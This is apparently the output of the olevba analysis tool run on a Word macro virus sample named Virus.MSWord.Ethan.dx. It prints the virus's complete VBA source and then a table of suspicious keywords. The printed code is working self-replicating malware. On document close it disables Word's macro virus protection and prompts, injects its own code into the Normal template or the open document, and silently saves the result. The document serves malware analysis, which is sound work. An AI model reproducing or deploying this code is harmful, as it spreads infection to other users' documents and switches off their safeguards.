olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.dx-54a1aedab6792580d1ebe3cc623efe1fee5335f7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.dx-54a1aedab6792580d1ebe3cc623efe1fee5335f7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Version = 0.24
' Ďî÷ĺěó ňű íĺ ńęŕçŕë Áĺ-Áĺ ???
    On Error Resume Next
    s = ActiveDocument.Saved
    Application.EnableCancelKey = Not -1
    With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
    Randomize
        Open NormalTemplate.Path & "\Normal.dat" For Output As #1
        Open NormalTemplate.Path & "\License.dat" For Output As #2
        For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
            a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
            Print #1, a
            If i = 2 Then Print #2, a
        Next i
        Close #1
        Close #2
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
        If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 7) <> "Version" Then
            Set t = NormalTemplate.VBProject.VBComponents.Item(1)
        End If
    ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
        Set t = ActiveDocument.VBProject.VBComponents.Item(1)
    Else
        t = ""
    End If
    If t <> "" Then
        Open NormalTemplate.Path & "\Normal.dat" For Input As #1
        If LOF(1) = 0 Then GoTo q
        i = 1
        Do While Not EOF(1)
            Line Input #1, a
            t.CodeModule.InsertLines i, a
            i = i + 1
        Loop
q:      Close #1
        If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        If Rnd < 0.3 Then
            a = MsgBox("You are lamer? Press OK to confirm", vbOKOnly, "Windows NT")
        End If
    End If
    Kill NormalTemplate.Path & "\Normal.dat"
    If Rnd < 0.05 Then
        ActiveDocument.Content.InsertFile NormalTemplate.Path & "\License.dat"
        ActiveDocument.Save
    End If
    If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
    Kill NormalTemplate.Path & "\License.dat"
End Sub

Private Sub Document_New()
    a = MsgBox("Č çŕ÷ĺě ňĺáĺ ýňîň ďóńňîé ôŕéë ???", vbQuestion, "WindowsNT")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
